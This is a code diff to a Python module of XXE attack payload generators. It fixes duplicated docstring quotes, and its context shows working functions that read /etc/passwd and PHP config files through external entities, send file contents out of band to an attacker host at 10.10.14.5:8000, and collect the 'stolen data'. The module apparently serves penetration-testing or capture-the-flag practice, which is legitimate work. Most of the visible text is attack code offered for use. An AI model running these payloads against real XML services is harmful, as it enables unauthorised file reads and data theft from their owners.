@@ -75,7 +75,6 @@ def basic_file_read(file_path: str = "/etc/passwd", entity_name: str = "xxe") ->
         ... payload = basic_file_read("/etc/passwd")
         >>> # If vulnerable, response will contain passwd file
     """
-    """
     return f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY {entity_name} SYSTEM "file://{file_path}">]>
 <root>&{entity_name};</root>'''
@@ -104,7 +103,6 @@ def blind_oob(base_url: str, file_path: str = "/etc/passwd", dtd_path: str = "xx
     Examples:
         ... payload = blind_oob("http://10.10.14.5:8000")
         >>> # Send this payload to the target's XML endpoint
-    """
     """
     dtd_url = _normalize_url(base_url, dtd_path)
     return f'''<?xml version="1.0" encoding="UTF-8"?>
@@ -175,7 +173,6 @@ def parameter_entity(base_url: str, file_path: str = "/etc/passwd") -> str:
         ... payload = parameter_entity("http://10.10.14.5:8000")
         >>> # One payload does everything - no DTD file needed!
     """
-    """
     exfil_url = _normalize_url(base_url, "queue")
     return f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -218,7 +215,6 @@ def php_filter_b64(file_path: str = "/etc/passwd") -> str:
         ... payload = php_filter_b64("/var/www/config.php")
         >>> # Response will contain base64 encoded file
         >>> # Decode with: base64.b64decode(response_text)
-    """
     """
     return f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
@@ -348,7 +344,6 @@ def generate_oob_files(base_url: str, file_path: str = "/etc/passwd") -> tuple[s
         >>> # Get the stolen data
         >>> data = get_exfil()
     """
-    """
     # Generate and write the DTD (automatically writes to disk)
     dtd_file = oob_dtd(base_url, file_path)
 
@@ -384,7 +379,6 @@ def quick_test(base_url: str, file_path: str = "/etc/passwd") -> str:
 
         >>> # Get the result:
         ... print(get_exfil())
-    """
     """
     # Write the DTD file automatically
     oob_dtd(base_url, file_path)
